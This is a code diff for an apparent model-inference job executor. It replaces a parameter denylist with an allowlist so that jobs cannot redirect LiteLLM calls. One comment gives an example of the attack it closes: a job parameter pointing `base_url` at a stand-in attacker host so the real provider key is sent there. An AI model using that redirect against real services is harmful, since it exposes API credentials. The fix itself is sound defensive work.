@@ -36,12 +36,32 @@ _log = logging.getLogger("clusterbuck.cloud")
 # and this executor never runs more than one instance per coordinator process.
 CONSUMER_ID = "cbk-cloud-executor"
 
-# Mirrors worker/src/cbk_worker/model_client.py's _PARAMS_NOT_FORWARDED: `stream` and
-# `messages` are the request envelope, not inference parameters. `api_key`/`api_base` are
-# excluded so a job's `params` (client- or eval-harness-supplied) can never redirect this
-# call to a different endpoint or override which key it authenticates with — the key is
-# resolved from the capability's own `api_key_env` alone, per job, never from the wire.
-_PARAMS_NOT_FORWARDED = {"stream", "messages", "response_format", "api_key", "api_base"}
+# An ALLOWLIST, and the distinction is the whole security boundary here.
+#
+# This used to be a denylist mirroring worker/src/cbk_worker/model_client.py, blocking
+# {stream, messages, response_format, api_key, api_base}. That mirror was unsound, because
+# the two call sites do not resolve params the same way. The worker drops them into a JSON
+# body (`httpx.post(url, json=request)`), so an unexpected key is at worst an unexpected
+# field for the model server to ignore. This executor splats them as PYTHON KWARGS into
+# `litellm.acompletion(**request)`, so an unexpected key is a named argument to LiteLLM.
+#
+# `litellm.completion` declares `base_url` and `extra_headers`, and takes `**kwargs` on top
+# — so `api_base` was honoured too. A job could therefore carry
+# `params: {"base_url": "http://attacker/v1"}` and this coordinator would dial that host
+# CARRYING THE REAL PROVIDER KEY, which is exactly what the old comment promised could not
+# happen. `extra_headers` was a second route to the same place.
+#
+# A denylist is the wrong shape for that: it has to enumerate every alias LiteLLM has now
+# and every one it adds later. An allowlist fails closed on both. The sync plane
+# (`sync.py:_PASSTHROUGH`) already did it this way; this is the same list.
+#
+# `model` is deliberately absent — it is resolved in `_process` from the job's pin or the
+# capability's own default and set explicitly, so a client cannot reach past routing by
+# naming a different one here.
+_PARAMS_FORWARDED = {
+    "temperature", "max_tokens", "top_p", "stop", "presence_penalty",
+    "frequency_penalty", "n", "seed", "tools", "tool_choice", "user",
+}
 
 
 def cloud_capabilities(fleet: Fleet | None) -> list[str]:
@@ -145,10 +165,8 @@ class CloudExecutor:
             # under test (the eval harness does, model-evaluation.md), and that pin must
             # win over this capability's own default (model_client.py's identical ordering).
             request: dict = {"model": model, "messages": messages, "stream": False}
-            for name, value in (job.params or {}).items():
-                if name in _PARAMS_NOT_FORWARDED:
-                    continue
-                request[name] = value
+            request.update({k: v for k, v in (job.params or {}).items()
+                            if k in _PARAMS_FORWARDED})
 
             resp = await litellm.acompletion(api_key=api_key, **request)
             body = resp.model_dump()
